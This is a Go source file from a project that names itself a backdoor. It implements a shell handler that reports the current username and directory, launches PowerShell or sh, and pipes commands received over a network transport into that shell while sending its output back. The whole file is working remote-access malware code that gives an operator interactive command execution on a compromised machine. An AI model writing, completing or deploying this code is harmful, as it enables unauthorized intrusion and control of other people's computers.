package handler

import (
	"backdoor/transport"
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
)

func ShellHandler(t transport.Transport) {
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	cwd, _ := os.Getwd()
	header := fmt.Sprintf("[*] Usuario: %s\n[*] Directorio: %s\n", username, cwd)
	t.Write([]byte(header))

	var shell *exec.Cmd
	if runtime.GOOS == "windows" {
		shell = exec.Command("powershell.exe", "-NoLogo")
	} else {
		shell = exec.Command("sh")
	}

	stdin, _ := shell.StdinPipe()
	stdout, _ := shell.StdoutPipe()
	stderr, _ := shell.StderrPipe()

	err := shell.Start()
	if err != nil {
		t.Write([]byte(fmt.Sprintf("Error iniciando shell: %v\n", err)))
		return
	}

	// Lee la salida del proceso
	go func() {
		reader := bufio.NewReader(io.MultiReader(stdout, stderr))
		buf := make([]byte, 1024)
		for {
			n, err := reader.Read(buf)
			if err != nil {
				break
			}
			if n > 0 {
				t.Write(buf[:n])
			}
		}
	}()

	// Envía comandos al stdin
	for {
		input, err := t.Read()
		if err != nil {
			break
		}
		if string(input) == "exit\n" || string(input) == "exit\r\n" {
			stdin.Write([]byte("exit\n"))
			break
		}
		stdin.Write(input)
	}
}
